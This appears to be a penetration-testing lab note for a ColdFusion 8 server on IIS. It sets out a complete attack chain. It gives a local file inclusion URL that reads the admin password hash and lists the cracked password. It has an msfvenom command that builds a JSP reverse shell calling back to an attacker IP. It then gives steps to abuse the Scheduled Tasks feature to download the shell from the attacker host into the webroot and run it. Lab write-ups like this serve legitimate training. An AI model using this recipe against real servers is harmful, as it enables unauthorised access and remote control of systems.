* Hostname: mike
* Server: Microsoft-IIS/6.0
* Web Framework: Adobe ColdFusion
* Programming Language: CFML
* OS: Windows

**Wappalyzer**
![[mike-wappalyzer.png]]

**Home page**
![[home.png]]

**Candidate exploit**
```
https://www.exploit-db.com/exploits/14641
```

**Obtaining password hash through LFI**
```
http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

**Hash**
``aafdc23870ecbcd3d557b6423a8982134e17927e : pass123``

**Generate JSP reverse shell**
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.138 LPORT=9001 -f raw -o shell.jsp
```

### Writing Shell to File ([ColdFusion](https://nets.ec/Coldfusion_hacking#Writing_Shell_to_File)) 

-   Go to the Settings Summary tab on the left and find the 'Mappings' section.
-   One of the default mappings is /CFIDE. This is where you will be writing to.
-   Copy the path next to it. ``C:\Inetpub\wwwroot\CFIDE``
-   Enter the Debugging and Logging tab on the left panel and click 'Scheduled Tasks'
-   Click 'Schedule New Task'.
-   Set the task name to whatever you like
-   Change the URL to the URL of JSP shell ([http://KALI_IP/shell.jsp](http://KALI_IP/shell.jsp))
-   Check the option to save the output to a file. 
-   Paste the path you acquired from the Mappings into the 'File' field,
-   Type the name you want to save the shell as and the extension (jsp).
	- ``C:\Inetpub\wwwroot\CFIDE\shell.jsp``
-   Press **OK** and click the green check to run the task.
-   You should now be able to access the shell from http://10.11.1.10/CFIDE/shell.jsp

**Mapping directory**
``C:\Inetpub\wwwroot\CFIDE``


![[10.11.1.10 - mike (done)/screenshots/proof.png]]